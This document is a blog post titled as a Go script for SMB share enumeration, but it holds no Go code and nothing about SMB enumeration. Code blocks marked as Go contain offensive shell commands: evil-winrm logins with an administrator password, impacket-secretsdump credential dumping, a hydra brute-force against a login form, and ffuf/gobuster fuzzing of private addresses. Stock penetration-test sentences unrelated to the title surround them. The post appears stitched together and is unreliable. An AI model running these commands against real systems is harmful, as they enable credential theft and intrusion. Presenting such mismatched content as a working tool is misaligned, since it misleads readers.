---
TitleSEO: "SMB Share Enumeration Script in Go | ZureFX"
TitlePost: "SMB Share Enumeration Script — Go"
Author: "ZureFX"
Description: "A Go script for smb share enumeration script. Built for security research and automation."
Keywords: "script, automation, c, python, tool, go"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-347.html"
URL_IMAGES: ""
Date: "2024-03-09"
Tags: "Script, Automation, C, Python, Tool, Go"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-347"
Permalink: "/scripting/script-smb-share-enumeration-script-347.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `chisel`
- `GetNPUsers`
- `dcomexec`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

```go
evil-winrm -i 10.107.163.134 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.93.141.160/FUZZ
gobuster dir -u http://10.35.176.38/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

```go
evil-winrm -i 10.119.228.84 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.67.47.173 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.48.220.181/FUZZ
evil-winrm -i 10.50.145.70 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.33.155
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.179.147/FUZZ
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

```bash
gobuster dir -u http://10.20.230.106/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 17.54s
```
